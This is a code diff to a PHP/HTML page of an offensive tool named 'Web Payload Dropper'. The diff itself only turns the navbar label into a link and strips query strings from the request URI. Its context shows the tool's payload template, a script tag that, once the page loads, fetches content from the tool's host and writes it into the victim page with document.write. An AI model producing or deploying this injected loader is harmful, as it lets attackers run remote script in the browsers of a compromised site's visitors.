@@ -35,7 +35,7 @@
 		<!-- HEADER START -->
 		<div class="container">
 			<nav class="navbar navbar-dark bg-dark rounded-bottom">
-				<span class="navbar-brand">Web Payload Dropper</span>
+				<a class="navbar-brand" href="?">Web Payload Dropper</a>
 				<span class="navbar-text ml-auto mr-3">
 					Version 0.1
 				</span>
@@ -79,7 +79,7 @@
 					<div class="form-group">
 						<textarea class="form-control" id="dropper" rows="3"><?php
 							$dropper_template = "<script>var once = function(){once = 0;fetch(\"%s\").then(function(response) {return response.text();}).then(function(text){document.write(document.documentElement.outerHTML + text);});};document.addEventListener(\"DOMContentLoaded\", function(event) {once();});</script>";
-							$uri = explode('/', $_SERVER['REQUEST_URI']);
+							$uri = explode('/', explode('?', $_SERVER['REQUEST_URI'], 2)[0]);
 							unset($uri[count($uri) - 2]);
 							echo(sprintf($dropper_template, "http://" . $_SERVER['HTTP_HOST'] . implode($uri, '/')));
 						?></textarea>
